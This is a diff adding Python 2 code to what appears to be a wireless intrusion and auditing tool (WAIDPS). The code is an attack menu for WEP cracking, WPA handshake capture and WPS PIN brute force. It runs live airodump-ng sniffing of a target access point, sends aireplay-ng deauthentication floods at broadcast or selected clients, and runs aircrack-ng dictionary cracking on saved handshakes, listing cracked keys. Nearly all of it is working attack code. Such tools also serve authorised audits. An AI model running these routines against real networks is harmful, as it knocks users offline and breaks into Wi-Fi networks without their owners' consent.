+    __builtin__.ATTACK_AP_CIPHER=str(ListInfo_Cipher[mi])
+    __builtin__.ATTACK_AP_AUTH=str(ListInfo_Auth[mi])
+    __builtin__.ATTACK_AP_CH=str(ListInfo_Channel[mi])
+    printc (" ",fcolor.BRed + "1" + fcolor.SWhite + " - Crack " + fcolor.BYellow + "W" + fcolor.SWhite + "EP Access Point","")
+    printc (" ",fcolor.BRed + "2" + fcolor.SWhite + " - " + "Capture WPA " + fcolor.BYellow + "H" + fcolor.SWhite + "andshake " + fcolor.SGreen + "  [ " + str(SELCLN) + " client(s) ]","")
+    printc (" ",fcolor.BRed + "3" + fcolor.SWhite + " - WPS " + fcolor.BYellow + "B" + fcolor.SWhite + "ruteforce PIN","")
+    printc (" ",fcolor.BRed + "4" + fcolor.SWhite + " - Live " + fcolor.BYellow + "M" + fcolor.SWhite + "onitor Access Point ","")
+    printc (" ",fcolor.BRed + "0" + fcolor.SWhite + " - " + "" + fcolor.BYellow + "R" + fcolor.SWhite + "etrun","")
+    usr_resp=AskQuestion(fcolor.BGreen + "Select an option ","1/2/3/4/0 " + fcolor.SWhite + "Default - " + fcolor.BRed + str(SUGGESTOPT) ,"U",SUGGESTOPT,"1")
+    if usr_resp!="1" and usr_resp!="2" and usr_resp!="3" and usr_resp!="4" and usr_resp!="W" and usr_resp!="H" and usr_resp!="B" and usr_resp!="M":
+        OptAuditing("1")
+        return
+    else:
+        if usr_resp=="1" or usr_resp=="W":
+            ATTACKMODE="WEP"
+        elif usr_resp=="2" or usr_resp=="H":
+            ATTACKMODE="WPA Handshake"
+        elif usr_resp=="3" or usr_resp=="B":
+            ATTACKMODE="WPS Bruteforce"
+        else:
+            printc ("i",fcolor.BGreen + "Shutting down all interfaces .....","")
+            ShutdownMonitor()
+            KillAllMonitor()
+            CreateMonitor("1","")
+            LineBreak()
+            MonitorAccessPoint(__builtin__.ATTACK_AP_BSSID,"")
+            OptAuditing("")
+            return
+    LineBreak()
+    printc ("i",fcolor.BGreen + "Shutting down all interfaces .....","")
+    ShutdownMonitor()
+    KillAllMonitor()
+    if ATTACKMODE!="WPS Bruteforce":
+        CreateMonitor("1","")
+    else:
+        CreateMonitor("1",1)
+    LineBreak()
+    if ATTACKMODE=="WEP":
+        AttackWEPProc(SELMAC,SELCHN,__builtin__.CUR_CLIENT)
+    if ATTACKMODE=="WPA Handshake":
+        __builtin__.WPA_AUTOCLIENT=="ON";__builtin__.WPA_DEAUTH_MAC=""
+        __builtin__.HS_File="";__builtin__.HS_FileFull="";__builtin__.HS_FileStrict="";__builtin__.HS_FileStrictFull=""
+        AttackWPAProc(SELMAC,SELCHN,__builtin__.CUR_CLIENT,"")
+    if ATTACKMODE=="WPS Bruteforce":
+        AttackWPSProc(SELMAC,SELCHN,__builtin__.CUR_CLIENT,"")
+
+def AddClientMAC(CLMAC,SDATA):
+    SDATA=str(SDATA).lstrip().rstrip()
+    DAUTHCT=5
+    if SDATA=="":
+        SDATA=0
+    ActiveStatus=fcolor.SBlack + "Idle   "
+    MACIndex=-1
+    MACLoc=str(__builtin__.CUR_CLIENT_MAC).find(str(CLMAC))
+    if MACLoc!=-1:
+        MACIndex=int(MACLoc) -2
+        MACIndex=MACIndex/21
+        if __builtin__.CUR_CLIENT_PDATA[MACIndex]!=SDATA:
+            ActiveStatus=fcolor.SRed +  "Active "
+            __builtin__.CUR_CLIENT_PDATA[MACIndex]=SDATA
+    else:
+        __builtin__.CUR_CLIENT_MAC.append (CLMAC)
+        __builtin__.CUR_CLIENT_PDATA.append (SDATA)
+        ActiveStatus=fcolor.SRed + "Active "
+    return ActiveStatus
+
+def MonitorAccessPoint(TargetMAC,Auto):
+    __builtin__.ATTACK_AP_PDATA=""
+    __builtin__.ATTACK_AP_PBEACON=""
+    __builtin__.WPA_DEAUTH_MAC=""
+    IGNORE_NEG_CLIENT="OFF"
+    __builtin__.CUR_CLIENT_MAC=[]
+    __builtin__.CUR_CLIENT_PDATA=[]
+    TargetMAC2=str(TargetMAC).replace(":","")
+    if Auto=="":
+        printc ("i",fcolor.BBlue + "Monitoring of Access Point","")
+        printc (" ",fcolor.SWhite + "This option allow user to monitor a specific access point and monitor if the access point or wireless clients are active or idle. .","")
+    __builtin__.TStart=Now()
+    print ""
+    printc ("i",fcolor.BGreen + "Time Start : " + fcolor.SWhite + str(__builtin__.TStart),"")
+    FName=tmpdir + "MON_" + str(TargetMAC).replace(":","") + "_TMP"
+    DelFile(FName + "*.*","")
+    print ""
+    printc (".",fcolor.SWhite + Now() + " - " + fcolor.SGreen + "Starting Sniffer for Access Point [ " + fcolor.SYellow +str(TargetMAC) + fcolor.SGreen + " ]..","")
+    cmdLine="xterm -geometry 100x20-0-200 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Sniffing Packet' -e 'airodump-ng --bssid " + TargetMAC  + " -c" + str(__builtin__.ATTACK_AP_CH) + " -w " + FName + " " + str(__builtin__.SELECTED_MON) + " | tee " + tmpdir + "SNIF_RESULT.txt" + "'"
+    ps=subprocess.Popen(cmdLine , shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'),preexec_fn=os.setsid)		
+    __builtin__.Sniffer=ps.pid
+    MONITORING_STOP=""
+    NEWCLIENT=[]
+    DAUTHCT=5
+    WAITRATE=5
+    CHECKFS=""
+    __builtin__.CapFile=FName + "-01.cap"
+    while MONITORING_STOP=="":
+        LineBreak()
+        os.system('clear')
+        CenterText(fcolor.BGBlue + fcolor.BWhite,"< < <<  LIVE MONITORING OF ACCESS POINT " + str(TargetMAC) + "  >> > >      ")
+        print ""
+        DisplayAPDetail()
+ 
+        if len(__builtin__.CUR_CLIENT)>0:
+            cl=0
+            printc ("i",fcolor.BBlue + "Client MAC ID      Status  Device First Seen    Device Last Seen    Inactive    PWR    Frames   Device Manufacturer / Possible Type ","")
+            __builtin__.SORT_CLIENT=[]
+            while cl<len(__builtin__.CUR_CLIENT):
+                ActiveStatus=""
+                IGNORE=""
+                if IGNORE_NEG_CLIENT=="ON" and str(__builtin__.CUR_CLIENT_PWR[cl]).lstrip().rstrip()=="-1":
+                    IGNORE="1"
+                if IGNORE=="":
+                    OUI=Check_OUI(__builtin__.CUR_CLIENT[cl],"")
+                    NewClient=""
+                    MACIndex=-1
+                    MACLoc=str(__builtin__.CUR_CLIENT_MAC).find(str(__builtin__.CUR_CLIENT[cl]))
+                    if MACLoc==-1:
+                        NewClient=fcolor.BGreen + " [New Detected]"
+                    ActiveStatus=AddClientMAC(__builtin__.CUR_CLIENT[cl],__builtin__.CUR_CLIENT_DATA[cl])
+                    Elapse=CalculateTime (str(__builtin__.CUR_CLIENT_FS[cl]).lstrip().rstrip(),str(__builtin__.CUR_CLIENT_LS[cl]).lstrip().rstrip())
+                    MC=fcolor.SWhite + "" + fcolor.BGreen + __builtin__.CUR_CLIENT[cl] + "  " + str(ActiveStatus) + fcolor.SWhite + str(__builtin__.CUR_CLIENT_FS[cl]) + " " + str(__builtin__.CUR_CLIENT_LS[cl]) + "  " + fcolor.SBlack + str(__builtin__.TimeGapFull).ljust(10) + fcolor.SYellow + str(__builtin__.CUR_CLIENT_PWR[cl]).ljust(5) + fcolor.SGreen + str(__builtin__.CUR_CLIENT_DATA[cl]).ljust(12)  + fcolor.SCyan + str(OUI) + fcolor.SPink + " " + str(NewClient)
+                    CP=str(__builtin__.CUR_CLIENT_PWR[cl]).lstrip().rstrip()[1:]
+                    AP=str(__builtin__.ATTACK_AP_PWR)[1:]
+                    Report=""
+                    if CP!="" and AP!="" and AP!="1" and CP!="1" and AP!="127" and CP!="127":
+                        if int(CP)<int(AP):
+                            Report=fcolor.SGreen + "\t\t\t\t" + " Station Nearer"  #"fcolor.SBlue + "Your Location " + fcolor.SWhite + "--> " + fcolor.SGreen + "Station      " + fcolor.SWhite + "--> " + fcolor.SPink + "Access Point"
+                        else:
+                            Report=fcolor.SPink + "\t\t\t\t" + " Access Point Nearer"  #  =fcolor.SBlue + "Your Location " + fcolor.SWhite + "--> " + fcolor.SPink +  "Access Point " + fcolor.SWhite + "--> " + fcolor.SGreen+ "Station"
+                    if Report!="":
+                        MC = MC + "\n" + tabspacefull + Report 
+                    if str(__builtin__.CUR_CLIENT_PROBE[cl])!="":
+                        MC=MC + "\n" + tabspacefull + fcolor.SWhite + "Probe  : " + fcolor.SBlue + str(__builtin__.CUR_CLIENT_PROBE[cl])
+                    __builtin__.SORT_CLIENT.append (str(MC))
+                cl=cl+1
+            cl=0
+            __builtin__.SORT_CLIENT.sort()
+            while cl<len(__builtin__.SORT_CLIENT):
+                printc (cl+1,__builtin__.SORT_CLIENT[cl],"")
+                cl=cl+1
+            
+        else:
+            printc ("!",fcolor.SRed + "No client found !!","")
+        LineBreak()
+        t=0
+        retkey=""
+        if CHECKFS=="":
+            print ""
+            FS=0
+            NW=Now()
+            while FS<240:
+                if IsFileDirExist(FName + "-01.csv")=="F": 
+                    statinfo = os.stat(FName + "-01.csv")
+                    FS=statinfo.st_size
+                else:
+                    FS=0
+                PrintText=fcolor.BBlue + str(NW) + " - " +  "Locating Access Point [ " + fcolor.BYellow + __builtin__.ATTACK_AP_BSSID + fcolor.BBlue + " ] on Channel " + fcolor.BYellow + __builtin__.ATTACK_AP_CH + fcolor.BBlue + ", Please wait...."
+                bcolor=fcolor.SWhite
+                pcolor=fcolor.BGreen
+                tcolor=fcolor.SGreen
+                s=bcolor + "[" + pcolor + str(t) + bcolor + "]" + __builtin__.tabspace + tcolor + PrintText + "\r"
+                sl=len(s)-3
+                print s,
+                sys.stdout.flush()
+                time.sleep(1)
+                t=t+1
+                s=""
+                ss="\r"
+                print "" + s.ljust(sl) + ss,
+                sys.stdout.flush()
+                if t>25:
+                    usr_resp=AskQuestion(fcolor.BGreen + "Access point still not located, continue ?" + fcolor.BGreen,"y/N","U","N","1")
+                    if usr_resp=="Y":
+                        NW=Now()
+                        t=1
+                    else:
+                        LineBreak()
+                        KillSubProc(__builtin__.Sniffer)
+                        DelFile(FName + "*.*","")
+                        OptAuditing("")
+                        return;
+            CHECKFS=statinfo.st_size
+        
+        if MONITORING_STOP=="":
+            if retkey=="":
+                retkey=WaitProcessing(WAITRATE,1)
+            while retkey!="":
+                LineBreak()
+                MSG=""
+                printc ("i",fcolor.BBlue + "Live Access Point Monitoring Menu","")
+                MSG=MSG + tabspacefull + fcolor.BRed + "1/0" + fcolor.SWhite + " - St" + fcolor.BYellow + "o" + fcolor.SWhite + "p Monitoring\n"
+                MSG=MSG + tabspacefull + fcolor.BRed + "2/D" + fcolor.SWhite + " - " + fcolor.BYellow + "D" + fcolor.SWhite + "eauth Broadcast / Client\n"
+                CLCT=len(__builtin__.CUR_CLIENT)
+                if CLCT==0:
+                    CLCT="No Client"
+                else:
+                    CLCT=str(CLCT) + " Client(s)"
+                MSG=MSG + tabspacefull + fcolor.BRed + "3/C" + fcolor.SWhite + " - List " + fcolor.BYellow + "C" + fcolor.SWhite + "lients\t\t" + fcolor.SGreen + " [ " + str(CLCT) + " ]\n"
+                MSG=MSG + tabspacefull + fcolor.BRed + "4/H" + fcolor.SWhite + " - View " + fcolor.BYellow + "H" + fcolor.SWhite + "andshake Captured\n"
+                MSG=MSG + tabspacefull + fcolor.BRed + "5/W" + fcolor.SWhite + " - Open Current Captured with " + fcolor.BYellow + "W" + fcolor.SWhite + "ireshark - " + fcolor.SGreen + str(__builtin__.CapFile) + "\n"
+                MSG=MSG + tabspacefull + fcolor.BRed + "6/L" + fcolor.SWhite + " - " + fcolor.BYellow + "L" + fcolor.SWhite + "ookup Database History\n"
+                MSG=MSG + tabspacefull + fcolor.BRed + "7/F" + fcolor.SWhite + " - Re" + fcolor.BYellow + "f" + fcolor.SWhite + "resh Rate\t\t" + fcolor.SGreen + " [ " + str(WAITRATE) + " seconds ]\n"
+                MSG=MSG + tabspacefull + fcolor.BRed + "8/N" + fcolor.SWhite + " - Ignore " + fcolor.BYellow + "N" + fcolor.SWhite + "egative [-1] Client - " + fcolor.SGreen + "Current " + str(IGNORE_NEG_CLIENT) + "\n"
+                MSG=MSG + tabspacefull + fcolor.BRed + "9/R" + fcolor.SWhite + " - " + fcolor.BYellow + "R" + fcolor.SWhite + "estart Monitoring\n"
+                MSG=MSG + tabspacefull + fcolor.BRed + "0/T" + fcolor.SWhite + " - Re" + fcolor.BYellow + "t" + fcolor.SWhite + "urn\n"
+                print MSG
+                usr_resp=AskQuestion("Select an option",fcolor.BRed + "0" + fcolor.BYellow + " - Return","U"," ","1")
+                if usr_resp!="0" and usr_resp!="T":
+                    print ""
+                    if usr_resp=="1" or usr_resp=="O":
+                        KillAllMonitor()
+                        LineBreak()
+                        DisplayComplete(__builtin__.TStart)
+                        KillSubProc(__builtin__.Sniffer)
+                        DelFile(FName + "*.*","")
+                        print "";printc ("x","","")
+                        return;
+                    elif usr_resp=="2" or usr_resp=="D":
+                        MSG=""
+                        LineBreak()
+                        printc ("+",fcolor.BBlue + "Deauth Broadcast / Client","")
+                        MSG=MSG + tabspacefull + fcolor.BRed + "1/B" + fcolor.SWhite + " - Deauth Broadcast\n"
+                        MSG=MSG + tabspacefull + fcolor.BRed + "2/C" + fcolor.SWhite + " - Deauth Client " + fcolor.SRed + str(__builtin__.WPA_DEAUTH_MAC)
+                        print MSG
+                        usr_resp=str(AskQuestion( "Enter your option","1/2" + fcolor.SWhite + " - Default 1","U","1","")).lstrip().rstrip()
+                        print ""
+                        DEAUTH=""
+                        if usr_resp=="1" or usr_resp=="B":
+                            DAUTHCT=str(AskQuestion("Enter the number of time to send deauth signal",fcolor.SGreen + "Default - " + str(DAUTHCT),"U",DAUTHCT,"")).lstrip().rstrip()
+                            if DAUTHCT.isdigit()!=True or DAUTHCT=="0":
+                                DAUTHCT=5
+                            print ""
+                            printc (".",fcolor.BRed + "Broadcasting Deauthentication Signal To All Clients..." + fcolor.SGreen + " (x" + str(DAUTHCT) + ") ","")
+                            cmd = [ "aireplay-ng","-0", str(DAUTHCT),"-a", str(__builtin__.ATTACK_AP_BSSID), str(__builtin__.SELECTED_MON)]
+                            ps = Popen(cmd, stdout=PIPE, stderr=open(os.devnull))
+                            ps.wait()
+                        if usr_resp=="2" or usr_resp=="C":
+                            if len(__builtin__.CUR_CLIENT)>0:
+                                ListClientFound()
+                            DefaultVal="X"
+                            Default="Default - Return"
+                            if str(__builtin__.WPA_DEAUTH_MAC)!="":
+                                printc ("i",fcolor.BGreen + "Current Deauth Client MAC : " + fcolor.BRed + str(__builtin__.WPA_DEAUTH_MAC),"")
+                                printc (" ",fcolor.SWhite + "To remove the current MAC, enter [" + fcolor.BRed + "X" + fcolor.SWhite +"]","")
+                                Default="Default - " + str(__builtin__.WPA_DEAUTH_MAC) 
+                                DefaultVal=__builtin__.WPA_DEAUTH_MAC
+                            MAC=str(AskQuestion("Enter the Client MAC to Deauth xx:xx:xx:xx:xx:xx :",fcolor.SGreen + str(Default),"U",DefaultVal,"1")).lstrip().rstrip()
+                            if MAC!="" and MAC!="X":
+                                if MAC.isdigit()==True:
+                                    if int(MAC.isdigit())-1<int(len(__builtin__.CUR_CLIENT)):
+                                        MAC=__builtin__.CUR_CLIENT[int(MAC)-1]
+                                        printc (" ",fcolor.SWhite + " Selected ==> " + fcolor.BYellow + str(MAC),"")
+                                if len(MAC)!=17 or IsHex(MAC)==False:
+                                    printc ("!!!","Invalid MAC Address Entered !","")
+                                    print ""
+                                elif MAC!="X": 
+                                    __builtin__.WPA_DEAUTH_MAC=MAC
+                                    print ""
+                                    DAUTHCT=str(AskQuestion("Enter the number of time to send deauth signal",fcolor.SGreen + "Default - " + str(DAUTHCT),"U",DAUTHCT,"")).lstrip().rstrip()
+                                    if DAUTHCT.isdigit()!=True or DAUTHCT=="0":
+                                        DAUTHCT=5
+                                    CLIENTMAC=__builtin__.WPA_DEAUTH_MAC
+                                    print ""
+                                    printc (".",fcolor.SWhite + Now() + " - " + fcolor.BRed + "Sending Deauthentication Signal To Selected Client : " + fcolor.BYellow + CLIENTMAC + fcolor.SGreen + " (x" + str(DAUTHCT) + ") ","")
+                                    cmd = [ "aireplay-ng","-0", str(DAUTHCT),"-a", str(__builtin__.ATTACK_AP_BSSID),"-c", str(CLIENTMAC), str(__builtin__.SELECTED_MON)]
+                                    ps = Popen(cmd, stdout=PIPE, stderr=open(os.devnull))
+                                    lines=ps.communicate()
+                                    lines=str(lines).replace("\\r\\n","\t")
+                                    lines=str(lines).split("\t")
+                                    lines=RearrangeReturn(lines)
+                                    NORESULT="1";TCL_ACK=0;TAP_ACK=0
+                                    for line in lines:
+                                        line=str(line).replace("\n","").replace("\r","")
+                                        if line!="":
+                                            lina=str(line).replace("\x00","").replace("[","").replace("]","").replace("|"," ").replace("  "," ").replace(" ",",")    
+                                            lina=lina+",,,,,,,,,"
+                                            LSPLIT=str(lina).split(",")
+                                            if len(LSPLIT)>9:
+                                                if LSPLIT[5]=="STMAC:" and len(LSPLIT[6])==17 and LSPLIT[9]=="ACKs":
+                                                    T_PKTS=int(LSPLIT[2])*2
+                                                    CL_ACK=LSPLIT[7]
+                                                    TCL_ACK=TCL_ACK + int(CL_ACK)
+                                                    if int(CL_ACK)==0:
+                                                        CL_ACK=fcolor.BRed + str(CL_ACK)
+                                                    AP_ACK=LSPLIT[8]
+                                                    TAP_ACK=TAP_ACK+int(AP_ACK)
+                                                    if int(AP_ACK)==0:
+                                                        AP_ACK=fcolor.BRed + str(AP_ACK)
+                                                    printc (" ",fcolor.SGreen + "Packet Sent : " + fcolor.BGreen + str(T_PKTS) + fcolor.SGreen + "\t\tAccess Point [ " + fcolor.SWhite + __builtin__.ATTACK_AP_BSSID + fcolor.SGreen + " ] ACKs : " + fcolor.BGreen + str(AP_ACK) + fcolor.SGreen + "\tClient [ " + fcolor.SWhite + CLIENTMAC + fcolor.SGreen + " ] ACKs : " + fcolor.BGreen + str(CL_ACK),"")
+                                                    NORESULT=""
+                                    if NORESULT=="1":
+                                        printc ("!",fcolor.SRed + "No Result !!","")
+                                    else:
+                                        MSG=""
+                                        if int(TCL_ACK)==0:
+                                            MSG=MSG + "No acknowledgement received from Client"    
+                                        if int(TAP_ACK)==0:    
+                                            if MSG=="":
+                                                MSG="No acknowledgement received from Access Point"
+                                            else:
+                                                MSG="No acknowledgement received from Access Point and Client"
+                                        if MSG!="":
+                                            printc (" ",fcolor.SRed + MSG,"")
+                            else:
+                                printc (".",fcolor.SRed + "MAC address removed..","")
+                                __builtin__.WPA_DEAUTH_MAC=""
+                    elif usr_resp=="7" or usr_resp=="F":
+                        usr_resp=str(AskQuestion("Enter the refresh rate",fcolor.SGreen + "Default - " + str(WAITRATE),"U",WAITRATE,"")).lstrip().rstrip()
+                        if usr_resp.isdigit()==True:
+                            WAITRATE=int(usr_resp)
+                    elif usr_resp=="3" or usr_resp=="C":
+                        if len(__builtin__.CUR_CLIENT)>0:
+                            ListClientFound()
+                        else:
+                            printc ("!",fcolor.SRed + "No client found !!","")
+                    elif usr_resp=="8" or usr_resp=="N":
+                        if IGNORE_NEG_CLIENT=="ON":
+                            IGNORE_NEG_CLIENT="OFF"
+                        else:
+                            IGNORE_NEG_CLIENT="ON"
+                    elif usr_resp=="9" or usr_resp=="R":
+                        printc ("i",fcolor.BGreen + "Restarting Monitoring process .....","")
+                        KillAllMonitor()
+                        LineBreak()
+                        MonitorAccessPoint(__builtin__.ATTACK_AP_BSSID,"")
+                        return
+                    elif usr_resp=="6" or usr_resp=="L":
+                        OptInfoDisplay("","1")
+                    elif usr_resp=="5" or usr_resp=="W":
+                        LineBreak()
+                        if IsProgramExists("wireshark")==True:
+                            Rund="wireshark -r " + str(__builtin__.CapFile) + " > /dev/null 2>&1 &"
+                            print fcolor.BBlue + spacing + "Open Current Captured Packets With Wireshark - " + fcolor.BYellow + str(__builtin__.CapFile)
+                            result=os.system(Rund)
+                    elif usr_resp=="4" or usr_resp=="H":
+                        ManualCheckHandShake(__builtin__.CapFile)
+                else:
+                    retkey=""
+            LineBreak()
+            NEWCLIENT=GetClientFromCSV (FName + "-01.csv")
+            if len(NEWCLIENT)>0:
+                __builtin__.CUR_CLIENT=__builtin__.NEW_CLIENT
+                ClentList=__builtin__.NEW_CLIENT
+                __builtin__.CUR_CLIENT_FS=__builtin__.NEW_CLIENT_FS
+                __builtin__.CUR_CLIENT_LS=__builtin__.NEW_CLIENT_LS
+                __builtin__.CUR_CLIENT_PWR=__builtin__.NEW_CLIENT_PWR
+                __builtin__.CUR_CLIENT_DATA=__builtin__.NEW_CLIENT_DATA
+                __builtin__.CUR_CLIENT_PROBE=__builtin__.NEW_CLIENT_PROBE
+    DisplayComplete(__builtin__.TStart)
+    KillSubProc(__builtin__.Sniffer)
+    DelFile(FName + "*.*","")
+    LineBreak()
+    printc ("x","","")
+    OptAuditing("")
+    return
+
+def Hex2Chr(sHex):
+    return ''.join((chr(int(sHex[i:i+2],16)) if int(sHex[i:i+2],16) >= 32 and int(sHex[i:i+2],16) <=126  else '.') for i in range(0,len(sHex),2))
+
+def AddHexColon(sHex):
+    return ':'.join(sHex[i:i+2] for i in range(0,len(sHex),2))
+
+def ConvertHex(sHex):
+    sHex=str(sHex).replace(":","").replace("-","")
+    __builtin__.STR_HEX=str(sHex).upper()
+    __builtin__.STR_CHR=''.join((chr(int(sHex[i:i+2],16)) if int(sHex[i:i+2],16) >= 32 and int(sHex[i:i+2],16) <=126  else '.') for i in range(0,len(sHex),2))
+    __builtin__.STR_HEXCOLON=':'.join(sHex[i:i+2] for i in range(0,len(sHex),2))
+    __builtin__.STR_LENHEX=len(sHex)
+    __builtin__.STR_LEN=len(sHex)/2
+    if int(__builtin__.STR_LENHEX)==10:
+        __builtin__.STR_BIT="64"
+    if int(__builtin__.STR_LENHEX)==26:
+        __builtin__.STR_BIT="128"
+
+def CheckCrackingStatus(TargetMAC):
+    DInfo=""
+    TargetMAC2=str(TargetMAC).replace(":","")
+    HS_File=savedir + "Handshake_" + TargetMAC2 + "*.cap"
+    FFILE=[]
+    FFILE=glob.glob(HS_File)
+    if len(FFILE)>0:
+        DInfo=fcolor.SWhite + " [Handshake]"
+    Found=CheckCrackDB(TargetMAC)
+    if Found=="1":
+        DWPS=""
+        if str(__builtin__.DB_WPS)!="":
+            DWPS=fcolor.SWhite + " WPS=" + fcolor.SYellow + __builtin__.DB_WPS
+        DInfo=fcolor.SWhite + " [Cracked] - " + fcolor.SYellow + str(__builtin__.DB_ENCKEY) + str(DWPS)
+    return DInfo
+
+def GetFileMaxLength(FFILE):
+    c=0
+    lth=0
+    while c<len(FFILE):
+        filename=str(FFILE[c]).replace(savedir,"")
+        fl=len(filename)
+        if fl>lth:
+            lth=fl
+        c=c+1
+    return lth
+
+def DisplayCapturedFile(HS_File):
+    FFILE=[]
+    FFILE=glob.glob(HS_File)
+    MaxFLen=GetFileMaxLength(FFILE)
+    MaxFLen=MaxFLen+5
+    __builtin__.CapFileList=[]
+    if len(FFILE)>0:
+        FFILE.sort()
+        cl=0
+        fct=0
+        colr=0;Cracked=""
+        printc ("i",fcolor.BGreen + "List of saved WPA Handshake files.","")
+        while cl<len(FFILE):
+            if IsFileDirExist(FFILE[cl])=="F":
+                FOUND=CheckCrackDB(FFILE[cl])
+                if FOUND=="1":
+                    DWPS=""
+                    if str(__builtin__.DB_WPS)!="":
+                        DWPS=fcolor.SWhite + " WPS=" + fcolor.SYellow + __builtin__.DB_WPS
+                    Cracked=fcolor.BRed + " \t[Cracked]" + fcolor.BYellow + " - " + str(__builtin__.DB_ENCKEY) + str(DWPS)
+                GetFileDetail(FFILE[cl])
+                FName=str(FFILE[cl]).replace(savedir,"")
+                if colr==0:
+                    colr=1
+                    printc(" ",fcolor.SGreen + str(fct + 1) + " \t" + str(FName).ljust(MaxFLen) + str(__builtin__.FileModified) + "    " + str(__builtin__.FileSize) + str(Cracked) + "", "")
+                    __builtin__.CapFileList.append (str(FName))
+                else:
+                    colr=0
+                    printc(" ",fcolor.CDim + fcolor.White + str(fct + 1) + " \t" +  str(FName).ljust(MaxFLen) +  str(__builtin__.FileModified) + "    " + str(__builtin__.FileSize) + str(Cracked)  + "", "")
+                    __builtin__.CapFileList.append (str(FName))
+                
+                fct = fct + 1
+            Cracked=""
+            cl = cl+1
+        print ""
+        printc ("i",fcolor.BWhite + "Total " + fcolor.BRed + str(fct) + fcolor.BWhite + " file(s) listed.","")
+    else:
+        printc ("!",fcolor.SRed + "No saved WPA Handshake found !!","")
+        print "";
+
+def CrackWPAKey(HS_File,Auto):
+    DICTIONARYUSE="";WPA_CRACKED=""
+    if HS_File=="":
+        HS_File=savedir + "Handshake_" + "*.cap"
+    printc ("i",fcolor.BBlue + "WPA/WPA2 Handshake Cracking","")
+    printc (" ",fcolor.SWhite + "This function allow user to select captured WPA/WPA2 handshake file for cracking using Aircrack-NG.\n","")
+    if Auto=="":
+        DisplayCapturedFile(HS_File)
+    fileuse=""
+    FFILE=[]
+    FFILE=glob.glob(HS_File)
+    if len(FFILE)>0 :
+        if Auto=="":
+            usr_resp=AskQuestion("Enter a Handshake file above",fcolor.SGreen + "Default-Return / Help",""," ","")
+            print ""
+            if usr_resp!=" ":
+                FILTER=""
+                if str(usr_resp).upper()=="STRICT":
+                    FILTER="1";HS_File=savedir + "Handshake_" + "*_Strict*.cap";
+                if str(usr_resp).upper()=="FULL":
+                    FILTER="1";HS_File=savedir + "Handshake_" + "*Full.cap";
+                if str(usr_resp).upper()=="NONSTRICT":
+                    FILTER="1";HS_File=savedir + "Handshake_" + "*_Full.cap";
+                if str(usr_resp).upper()=="ALL":
+                    FILTER="1";HS_File=savedir + "Handshake_" + "*.cap";
+                if str(usr_resp).find("*")!=-1:
+                    usr_resp=str(usr_resp).replace("*","")
+                    FILTER="1";HS_File=savedir + "*" + str(usr_resp) + "*.cap";
+                if str(usr_resp).upper()=="HELP":
+                    FILTER="1"
+                    printc ("i",fcolor.BBlue + "Help options","")
+                    printc (" ", fcolor.BYellow + "ALL      " +   fcolor.SWhite + " - Show all captured Handshake files","")
+                    printc (" ", fcolor.BYellow + "FULL     " +   fcolor.SWhite + " - Show Full Packet Handshake files","")
+                    printc (" ", fcolor.BYellow + "STRICT   " + fcolor.SWhite + " - Show Strict Handshake files (4/4 HS)","")
+                    printc (" ", fcolor.BYellow + "NONSTRICT" + fcolor.SWhite + " - Show Non-Strict Handshake files (3/4 HS)","")
+                    printc (" ", fcolor.BYellow + "<Name>*  " + fcolor.SWhite + " - Show Filtered <Name> files [Case sensitive]. Ex : SYWorks*","")
+                    print ""
+                    printc ("x","","")
+                if FILTER=="1":
+                    LineBreak()
+                    CrackWPAKey(HS_File,Auto)
+                    return
+                if usr_resp.isdigit()==True:
+                    if int(usr_resp)-1<len(__builtin__.CapFileList):
+                        file1=savedir + str(__builtin__.CapFileList[int(usr_resp)-1])
+                    else:
+                        file1=savedir + usr_resp
+                else:
+                    file1=savedir + usr_resp
+                file2=usr_resp
+                fileuse=""
+                if IsFileDirExist(file1)=="F":
+                    fileuse=file1
+                elif IsFileDirExist(file2)=="F":
+                    fileuse=file2
+                else:
+                    printc ("!!!","The selected file " + fcolor.SWhite + str(usr_resp) + fcolor.BRed + " not found !","")
+                    printc ("x","","")
+                    LineBreak()
+                    CrackWPAKey(HS_File,Auto)
+                    return
+        else:
+            fileuse=HS_File
+        if fileuse!="":
+            LineBreak()
+            printl (tabspacefull + fcolor.BGreen + "Checking " + fcolor.SGreen + str(fileuse) + fcolor.BGreen + " for Handshake...","0","")
+            print ""
+            cmd="aircrack-ng \x22" + str(fileuse) + "\x22"
+            printl (tabspacefull + fcolor.SGreen + "Reading packets...\r","0","")
+            ps=subprocess.Popen(cmd , shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'),preexec_fn=os.setsid)
+            readout=str(ps.stdout.read())
+            lines=str(readout).split("\n")
+            p=0
+            blankct=0;crackstarted=""
+            msg="";FBSSID="";FESSID="";FEncr="";HS=0
+            for line in lines:
+                line=str(line).replace("\n","").replace("\r","").lstrip().rstrip()
+                if line!="":
+                    if str(line).find("BSSID")!=-1 and str(line).find("ESSID")!=-1 and str(line).find("Encryption")!=-1:
+                        p=1
+                        PosBSSID1=line.index("BSSID")
+                        PosESSID1=line.index("ESSID")
+                        PosBSSID2=PosESSID1-1
+                        PosEncr1=line.index("Encrypt")
+                        PosESSID2=PosEncr1-1
+                    if p==1 and str(line).find("handshake)")!=-1:
+                        FBSSID=str(line[PosBSSID1:PosBSSID2]).lstrip().rstrip()
+                        FESSID=str(line[PosESSID1:PosESSID2]).lstrip().rstrip()
+                        PosEncr2=len(line)
+                        FEncr=str(line[PosEncr1:PosEncr2]).lstrip().rstrip()
+                        if str(FEncr).find(" handshake)")!=-1:
+                            shs=[]
+                            shs=str(FEncr).replace("(","").replace(")","").split(" ")
+                            if len(shs)>2:
+                                if str(shs[0]).find("WPA")!=-1 and shs[2]=="handshake":
+                                   EncType=str(shs[0]).upper()
+                                   HS=shs[1]
+                                   HS=int(HS)
+                                   if HS>0:
+                                       msg="Found"
+                                   else:
+                                       msg="Handshake Not Found !!!"
+                    if str(line).find("No networks found")!=-1:
+                        msg="No Network Found !!!"
+            if msg=="Found":
+                print fcolor.BCyan + tabspacefull + str(HS) + " Handshake Found !!\t\t" + fcolor.SGreen + "BSSID : " + fcolor.BRed + str(FBSSID) + fcolor.SGreen + "\t\tESSID : " + fcolor.BPink + str(FESSID)
+                if Auto=="1":
+                    DICTIONARYUSE=__builtin__.SELECTED_DICT
+                else:
+                    print ""
+                    printc ("i",fcolor.BBlue + "List of Dictionary","")
+                    DisplayDictionaryList("1")
+                    print ""
+                    printc (" ",fcolor.SGreen + "Default Dectionary : " + fcolor.BYellow + str(__builtin__.SELECTED_DICT),"")
